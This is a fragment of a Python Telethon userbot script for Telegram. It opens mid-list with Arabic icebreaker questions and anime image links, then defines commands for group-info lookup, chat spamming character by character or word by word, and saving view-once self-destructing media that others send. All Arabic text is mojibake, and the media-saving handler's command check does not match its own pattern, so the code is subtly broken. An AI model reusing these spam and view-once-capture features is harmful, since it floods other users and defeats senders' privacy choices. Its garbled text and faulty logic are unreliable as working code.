    "ŸÖÿß ŸáŸà ŸÉÿ™ÿßÿ®ŸÉ ÿßŸÑŸÖŸÅÿ∂ŸÑÿü",
    "ŸÖÿß ŸáŸà ŸÖÿ≥ŸÑÿ≥ŸÑ Netflix  ÿßŸÑŸÖŸÅÿ∂ŸÑ ŸÑÿØŸäŸÉÿü",
    "ŸáŸÑ ÿ™ŸÅÿ∂ŸÑ ÿßŸÑÿµŸäŸÅ ÿßŸà ÿßŸÑÿ¥ÿ™ÿßÿ°ÿü",
    "ŸáŸÑ ÿ™ŸÅÿ∂ŸÑ ÿßŸÑÿπŸäÿ¥ ŸÅŸä ÿßŸÑŸÖÿØŸäŸÜÿ© ÿßŸà ÿßŸÑÿ±ŸäŸÅÿü",
    "ŸáŸÑ ÿ™ŸÅÿ∂ŸÑ ÿßŸÑŸÉŸÑÿßÿ® ÿßŸà ÿßŸÑŸÇÿ∑ÿ∑ÿü",
    "ŸÖÿß ŸáŸà ÿ±ÿ£ŸäŸÉ ŸÅŸä Ÿàÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿ™ŸàÿßÿµŸÑ ÿßŸÑÿßÿ¨ÿ™ŸÖÿßÿπŸäÿü",
    "ŸÖÿß ŸáŸä ŸÜÿµŸäÿ≠ÿ™ŸÉ ŸÑÿ£Ÿä ÿ¥ÿÆÿµ ŸäŸÖÿ± ÿ®ŸäŸàŸÖ ÿ≥Ÿäÿ°ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä ÿ™ŸÅÿ™ÿÆÿ± ÿ®Ÿáÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä ÿ™ÿÆÿßŸÅ ŸÖŸÜŸáÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ∂ÿ≠ŸÉÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ®ŸÉŸäÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿßŸÖÿ™ŸÜÿßŸÜÿü",
    "ŸÖÿß ŸáŸà ÿ™ÿπÿ±ŸäŸÅŸÉ ŸÑŸÑÿ≥ÿπÿßÿØÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿ™ÿπÿ±ŸäŸÅŸÉ ŸÑŸÑŸÜÿ¨ÿßÿ≠ÿü",
    "ŸÑŸà ŸÉÿßŸÜ ÿ®ÿ•ŸÖŸÉÿßŸÜŸÉ ÿßŸÖÿ™ŸÑÿßŸÉ ÿßŸä ŸÇŸàÿ© ÿÆÿßÿ±ŸÇÿ©ÿå ŸÖÿßÿ∞ÿß ÿ≥ÿ™ÿÆÿ™ÿßÿ±ÿü",
    "ŸÑŸà ŸÉÿßŸÜ ÿ®ÿ•ŸÖŸÉÿßŸÜŸÉ ÿßŸÑÿπŸàÿØÿ© ÿ®ÿßŸÑÿ≤ŸÖŸÜÿå ÿßŸÑŸâ ÿßŸä ŸÅÿ™ÿ±ÿ© ÿ≤ŸÖŸÜŸäÿ© ÿ≥ÿ™ÿπŸàÿØÿü",
    "ŸÖŸÜ ŸáŸà ŸÖÿ´ŸÑŸÉ ÿßŸÑÿ£ÿπŸÑŸâÿü",
    "ŸÖÿß ŸáŸä ÿ£ŸÉÿ®ÿ± ÿ∫ŸÑÿ∑ÿ© ÿ≥ŸàŸäÿ™Ÿáÿß ŸÅŸä ÿ≠Ÿäÿßÿ™ŸÉÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿØÿ±ÿ≥ ÿßŸÑŸÑŸä ÿ™ÿπŸÑŸÖÿ™Ÿá ŸÖŸÜ Ÿáÿ∞Ÿä ÿßŸÑÿ∫ŸÑÿ∑ÿ©ÿü",
    "ŸÖÿß ŸáŸä ÿ£ŸÅÿ∂ŸÑ ŸÜÿµŸäÿ≠ÿ©  ÿßŸÜÿπÿ∑ÿ™ ŸÑŸÉÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° ÿ™ÿπŸÑŸÖÿ™Ÿá ŸÖŸÜ ŸàÿßŸÑÿØŸäŸÉÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° ÿ™ÿ≠ÿ®Ÿá ŸÅŸä ŸÜŸÅÿ≥ŸÉÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° ÿ™ŸÉÿ±ŸáŸá ŸÅŸä ŸÜŸÅÿ≥ŸÉÿü",
    "ŸÉŸäŸÅ ÿ™ÿµŸÅ ŸÜŸÅÿ≥ŸÉ ŸÅŸä ÿ´ŸÑÿßÿ´ ŸÉŸÑŸÖÿßÿ™ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä ŸäŸÖŸäÿ≤ŸÉ ÿπŸÜ ÿ∫Ÿäÿ±ŸÉÿü",
    "ŸÖÿß ŸáŸä ÿ∑ŸÖŸàÿ≠ÿßÿ™ŸÉ ÿßŸÑŸÖÿ≥ÿ™ŸÇÿ®ŸÑŸäÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä ÿ™ÿ™ŸÖŸÜŸâ ÿ™ÿ≠ŸÇŸäŸÇŸá ŸÇÿ®ŸÑ ŸÖÿß ÿ™ŸÖŸàÿ™ÿü",
    "ŸáŸÑ ÿ™ÿ§ŸÖŸÜ ÿ®ÿßŸÑÿ≠Ÿäÿßÿ© ÿ®ÿπÿØ ÿßŸÑŸÖŸàÿ™ÿü",
    "ŸáŸÑ ÿ™ÿ§ŸÖŸÜ ÿ®ÿßŸÑÿ£ÿ¥ÿ®ÿßÿ≠ÿü",
    "ŸáŸÑ ÿ™ÿ§ŸÖŸÜ ÿ®ÿßŸÑŸÉÿßÿ¶ŸÜÿßÿ™ ÿßŸÑŸÅÿ∂ÿßÿ¶Ÿäÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿ±ÿ£ŸäŸÉ ŸÅŸä ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸäÿü",
    "ŸáŸÑ ÿ™ÿπÿ™ŸÇÿØ ÿ£ŸÜ ÿßŸÑÿ±Ÿàÿ®Ÿàÿ™ÿßÿ™ ÿ≥ÿ™ÿ≥Ÿäÿ∑ÿ± ÿπŸÑŸâ ÿßŸÑÿπÿßŸÑŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∫ÿ∂ÿ®ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿÆÿ¨ŸÑÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∞ŸÜÿ®ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿÆŸàŸÅÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≠ÿ≤ŸÜÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸàÿ≠ÿØÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÇŸÑŸÇÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ•ÿ≠ÿ®ÿßÿ∑ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÖŸÑŸÑÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ™ÿπÿ®ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ¨Ÿàÿπÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿπÿ∑ÿ¥ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÜÿπÿßÿ≥ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ®ÿ±ÿØÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≠ÿ±ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ£ŸÑŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ±ÿßÿ≠ÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≠ÿ®ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÉÿ±ÿßŸáŸäÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∫Ÿäÿ±ÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≠ÿ≥ÿØÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÜÿØŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∞ŸÑÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑŸÖŸáÿßŸÜÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∏ŸÑŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ∫ŸÅÿ±ÿßŸÜÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ¥ŸÉÿ±ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿßÿ≠ÿ™ÿ±ÿßŸÖÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ™ŸÇÿØŸäÿ±ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ´ŸÇÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ£ŸÖÿßŸÜÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿ≥ÿπÿßÿØÿ©ÿü"
]


image_links = [
    "https://t.me/Sk_x2/10",
    "https://t.me/Sk_x2/11",
    "https://t.me/Sk_x2/12",
    "https://t.me/Sk_x2/13",
    "https://t.me/Sk_x2/14",
    "https://t.me/Sk_x2/15",
    "https://t.me/Sk_x2/16",
    "https://t.me/Sk_x2/17",
    "https://t.me/Sk_x2/18",
    "https://t.me/Sk_x2/19",
    "https://t.me/Sk_x2/20",
    "https://t.me/Sk_x2/21",
    "https://t.me/Sk_x2/22",
    "https://t.me/Sk_x2/23",
    "https://t.me/Sk_x2/24",
    "https://t.me/Sk_x2/25",
    "https://t.me/Sk_x2/26",
    "https://t.me/Sk_x2/27",
    "https://t.me/Sk_x2/28",
    "https://t.me/Sk_x2/29",
    "https://t.me/Sk_x2/30",
    "https://t.me/Sk_x2/31",
    "https://t.me/Sk_x2/32",
    "https://t.me/Sk_x2/33",
    "https://t.me/Sk_x2/34",
    "https://t.me/Sk_x2/35",
    "https://t.me/Sk_x2/36",
    "https://t.me/Sk_x2/37",
    "https://t.me/Sk_x2/38",
    "https://t.me/Sk_x2/39",
    "https://t.me/Sk_x2/40",
    "https://t.me/Sk_x2/41",
    "https://t.me/Sk_x2/42",
    "https://t.me/Sk_x2/43",
    "https://t.me/Sk_x2/44",
    "https://t.me/Sk_x2/45",
    "https://t.me/Sk_x2/46",
    "https://t.me/Sk_x2/47",
    "https://t.me/Sk_x2/48",
    "https://t.me/Sk_x2/49",
    "https://t.me/Sk_x2/50",
    "https://t.me/Sk_x2/51",
    "https://t.me/Sk_x2/52",
    "https://t.me/Sk_x2/53",
    "https://t.me/Sk_x2/54",
    "https://t.me/Sk_x2/55",
    "https://t.me/Sk_x2/56",
    "https://t.me/Sk_x2/57",
    "https://t.me/Sk_x2/58",
    "https://t.me/Sk_x2/59",
    "https://t.me/Sk_x2/60",
    "https://t.me/Sk_x2/61",
    "https://t.me/Sk_x2/62",
    "https://t.me/Sk_x2/63",
    "https://t.me/Sk_x2/64",
    "https://t.me/Sk_x2/65",
    "https://t.me/Sk_x2/66",
    "https://t.me/Sk_x2/67",
    "https://t.me/Sk_x2/68",
    "https://t.me/Sk_x2/69",
    "https://t.me/Sk_x2/70",
    "https://t.me/Sk_x2/71",
    "https://t.me/Sk_x2/72",
    "https://t.me/Sk_x2/73",
    "https://t.me/Sk_x2/74",
    "https://t.me/Sk_x2/75",
    "https://t.me/Sk_x2/76",
    "https://t.me/Sk_x2/77",
    "https://t.me/Sk_x2/78",
    "https://t.me/Sk_x2/79",
    "https://t.me/Sk_x2/80",
    "https://t.me/Sk_x2/81",
    "https://t.me/Sk_x2/82",
    "https://t.me/Sk_x2/83",
    "https://t.me/Sk_x2/84",
    "https://t.me/Sk_x2/85",
    "https://t.me/Sk_x2/86",
    "https://t.me/Sk_x2/87",
    "https://t.me/Sk_x2/88",
    "https://t.me/Sk_x2/89",
    "https://t.me/Sk_x2/90",
    "https://t.me/Sk_x2/91",
    "https://t.me/Sk_x2/92",
    "https://t.me/Sk_x2/93",
    "https://t.me/Sk_x2/94",
    "https://t.me/Sk_x2/95",
    "https://t.me/Sk_x2/96",
    "https://t.me/Sk_x2/97"
]













@client.on(events.NewMessage(outgoing=True, pattern=r"(^\.ŸÉÿ™|\s\.ŸÉÿ™)\b|\.ÿßŸÜŸÖŸä"))
async def why(event):
    await event.delete()
    chat = await event.get_chat()

    matched_command = event.pattern_match.string
    if matched_command == ".ŸÉÿ™":
        message = random.choice(questions_list)
        await event.client.send_message(chat, message)

    elif matched_command == ".ÿßŸÜŸÖŸä":
        while True:
            try:
                random_image_link = random.choice(image_links)
                channel_name, message_id = random_image_link.split('/')[-2:]
                message = await client.get_messages(channel_name, ids=int(message_id))
                await client.send_message(chat, "ÿµŸàÿ± ÿßŸÜŸÖŸä:", file=message, silent=True)
                break
            except WebpageMediaEmptyError:
                pass
            

@client.on(events.NewMessage(pattern="\.ŸÉÿ¥ŸÅ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©(?: |$)(.*)", outgoing=True))
async def info_gop(event):
    await event.edit("`ÿ¨ÿßÿ±Ÿç ÿßŸÑŸÅÿ≠ÿµ ...`")
    chat = await get_chatinfo(event)
    
    if chat is None:
        return
    
    caption = await fetch_info(chat, event)
    try:
        await event.edit(caption, parse_mode="html")
    except Exception as e:
        print("Exception:", e)
        await event.edit("`ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ∫Ÿäÿ± ŸÖÿ™ŸàŸÇÿπ.`")

async def get_chatinfo(event):
    chat = event.pattern_match.group(1)
    chat_info = None

    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass

    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
        else:
            chat = event.chat_id

    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except:
        try:
            chat_info = await event.client(GetFullChannelRequest(chat))
        except ChannelInvalidError:
            await event.edit("`ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑŸÇŸÜÿßÿ© ÿ£Ÿà ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©..`")
            return None
        except ChannelPrivateError:
            await event.edit("`Ÿáÿ∞Ÿá ŸÇŸÜÿßÿ©/ŸÖÿ¨ŸÖŸàÿπÿ© ÿÆÿßÿµÿ© ÿ£Ÿà ÿ™ŸÖ ÿ≠ÿ∏ÿ±Ÿä ŸÖŸÜŸáÿß`")
            return None
        except ChannelPublicGroupNaError:
            await event.edit("`ÿßŸÑŸÇŸÜÿßÿ© ÿ£Ÿà ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØÿ©`")
            return None
        except (TypeError, ValueError) as err:
            await event.edit(str(err))
            return None
    return chat_info

async def fetch_info(chat, event):
    chat_obj_info = await event.client.get_entity(chat.chats[0].id)  
    broadcast = getattr(chat_obj_info, "broadcast", False)
    chat_type = "ŸÇŸÜÿßÿ©" if broadcast else "ŸÖÿ¨ŸÖŸàÿπÿ©"
    chat_title = chat_obj_info.title

    try:
        msg_info = await event.client(GetHistoryRequest(
            peer=chat_obj_info.id, offset_id=0, offset_date=datetime(2010, 1, 1),
            add_offset=-1, limit=1, max_id=0, min_id=0, hash=0
        ))
    except Exception as e:
        msg_info = None
        print("Exception:", e)

    first_msg_valid = bool(msg_info and msg_info.messages and msg_info.messages[0].id == 1)
    creator_valid = first_msg_valid and bool(msg_info.users)
    creator_id = msg_info.users[0].id if creator_valid else None
    creator_firstname = msg_info.users[0].first_name if creator_valid else "ÿ≠ÿ≥ÿßÿ® ŸÖÿ≠ÿ∞ŸàŸÅ"
    creator_username = f"@{msg_info.users[0].username}" if creator_valid and msg_info.users[0].username else None
    created = msg_info.messages[0].date if first_msg_valid else None
    former_title = (msg_info.messages[0].action.title if first_msg_valid and isinstance(msg_info.messages[0].action, MessageActionChannelMigrateFrom) and msg_info.messages[0].action.title != chat_title else None)

    try:
        dc_id, _ = get_input_location(chat.full_chat.chat_photo)
    except Exception:
        dc_id = "ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ"

    description = chat.full_chat.about
    members = getattr(chat.full_chat, "participants_count", getattr(chat_obj_info, "participants_count", None))
    admins = getattr(chat.full_chat, "admins_count", None)
    banned_users = getattr(chat.full_chat, "kicked_count", None)
    restricted_users = getattr(chat.full_chat, "banned_count", None)
    members_online = getattr(chat.full_chat, "online_count", 0)
    messages_sent = getattr(chat.full_chat, "read_inbox_max_id", None)
    exp_count = getattr(chat.full_chat, "pts", None)
    username = f"@{chat_obj_info.username}" if getattr(chat_obj_info, "username", None) else None
    slowmode = "ŸÜÿπŸÖ" if getattr(chat_obj_info, "slowmode_enabled", False) else "ŸÑÿß"
    slowmode_time = getattr(chat.full_chat, "slowmode_seconds", None)
    restricted = "ŸÜÿπŸÖ" if getattr(chat_obj_info, "restricted", False) else "ŸÑÿß"
    verified = "ŸÜÿπŸÖ" if getattr(chat_obj_info, "verified", False) else "ŸÑÿß"

    if admins is None:
        try:
            participants_admins = await event.client(GetParticipantsRequest(
                channel=chat_obj_info.id, filter=ChannelParticipantsAdmins(), offset=0, limit=0, hash=0
            ))
            admins = participants_admins.count if participants_admins else None
        except Exception as e:
            print("Exception:", e)

    caption = f"<b>ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖÿ™ÿßÿ≠ÿ©:</b>\n"
    caption += f"ÿßŸÑŸÖÿπÿ±ŸÅ: <code>{chat_obj_info.id}</code>\n"
    if chat_title:
        caption += f"ÿßÿ≥ŸÖ {chat_type}: {chat_title}\n"
    if former_title:
        caption += f"ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ≥ÿßÿ®ŸÇ: {former_title}\n"
    caption += f"ŸÜŸàÿπ {chat_type}: {'ÿπÿßŸÖÿ©' if username else 'ÿÆÿßÿµÿ©'}\n"
    if username:
        caption += f"ÿßŸÑÿ±ÿßÿ®ÿ∑: {username}\n"
    if creator_username:
        caption += f"ŸÖŸÜÿ¥ÿ¶ {chat_type}: {creator_username}\n"
    elif creator_valid:
        caption += f"ŸÖŸÜÿ¥ÿ¶ {chat_type}: <a href=\"tg://user?id={creator_id}\">{creator_firstname}</a>\n"
    if created:
        caption += f"ÿ™ÿßÿ±ŸäÿÆ ÿßŸÑÿ•ŸÜÿ¥ÿßÿ°: <code>{created.strftime('%b %d, %Y - %H:%M:%S')}</code>\n"
    caption += f"ŸÖÿπÿ±ŸÅ ŸÖÿ±ŸÉÿ≤ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™: {dc_id}\n"
    if exp_count:
        chat_level = int((1 + sqrt(1 + 7 * exp_count / 14)) / 2)
        caption += f"ŸÖÿ≥ÿ™ŸàŸâ {chat_type}: <code>{chat_level}</code>\n"
    if messages_sent:
        caption += f"ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑŸÖÿ±ÿ≥ŸÑÿ©: <code>{messages_sent}</code>\n"
    if members:
        caption += f"ÿßŸÑÿ£ÿπÿ∂ÿßÿ°: <code>{members}</code>\n"
    if admins:
        caption += f"ÿßŸÑŸÖÿ¥ÿ±ŸÅŸàŸÜ: <code>{admins}</code>\n"
    if members_online:
        caption += f"ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿ™ÿµŸÑŸàŸÜ ÿßŸÑÿ¢ŸÜ: <code>{members_online}</code>\n"
    if restricted_users:
        caption += f"ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖŸÇŸäÿØŸàŸÜ: <code>{restricted_users}</code>\n"
    if banned_users:
        caption += f"ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿ≠ÿ∏Ÿàÿ±ŸàŸÜ: <code>{banned_users}</code>\n"
    caption += f"ÿßŸÑŸàÿ∂ÿπ ÿßŸÑÿ®ÿ∑Ÿäÿ°: {slowmode}"
    if slowmode_time:
        caption += f", <code>{slowmode_time}s</code>\n"
    if restricted == "ŸÜÿπŸÖ":
        caption += f"ŸÖŸÇŸäÿØ: {restricted}\n"
    caption += f"ÿ™ŸÖ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜŸá ÿ®Ÿàÿßÿ≥ÿ∑ÿ© Telegram: {verified}\n"
    if description:
        caption += f"ÿßŸÑŸàÿµŸÅ: \n<code>{description}</code>\n"

    return caption

  
@client.on(events.NewMessage(outgoing=True, pattern=r"^\.ÿ≥ÿ®ÿßŸÖ$"))
async def spam_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    message = await event.get_reply_message()
    if not message or not message.text:
        return await event.reply("  Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÜÿµŸäÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ±.")

    text = message.text
    for char in text:
        await event.respond(char)
        await asyncio.sleep(0.8)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.Ÿàÿ≥ÿ®ÿßŸÖ$"))
async def word_spam_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return
    await event.delete()
    message = await event.get_reply_message()
    if not message or not message.text:
        return await event.reply("  Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ŸÜÿµŸäÿ© ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ±.")

    words = message.text.split()
    for word in words:
        await event.respond(word)
        await asyncio.sleep(1)


auto_save_enabled = False

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ŸàÿßŸà|\.ÿ≠ŸÅÿ∏ ÿßŸÑÿ∞ÿßÿ™Ÿäÿ©'))
async def rundrc(event):
    await event.delete()
    if event.pattern_match.group(0) == ".ÿ∞ÿßÿ™Ÿäÿ©":
        try:
            getrestrictedcontent = await event.get_reply_message()
            downloadrestrictedcontent = await getrestrictedcontent.download_media()
            await event.client.send_file("me", downloadrestrictedcontent)
            remove(downloadrestrictedcontent)
        except:
            pass
    elif event.pattern_match.group(0) == ".ÿ≠ŸÅÿ∏ ÿßŸÑÿ∞ÿßÿ™Ÿäÿ©":
        global auto_save_enabled
        auto_save_enabled = not auto_save_enabled
        if auto_save_enabled:
            await event.respond("ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ≠ŸÅÿ∏ ÿßŸÑŸàÿ≥ÿßÿ¶ÿ∑ ÿ∞ÿßÿ™Ÿäÿ© ÿßŸÑÿ™ÿØŸÖŸäÿ± ÿ™ŸÑŸÇÿßÿ¶ŸäŸãÿß.")
        else:
            await event.respond("ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ≠ŸÅÿ∏ ÿßŸÑŸàÿ≥ÿßÿ¶ÿ∑ ÿ∞ÿßÿ™Ÿäÿ© ÿßŸÑÿ™ÿØŸÖŸäÿ± ÿ™ŸÑŸÇÿßÿ¶ŸäŸãÿß.")

@client.on(events.NewMessage)
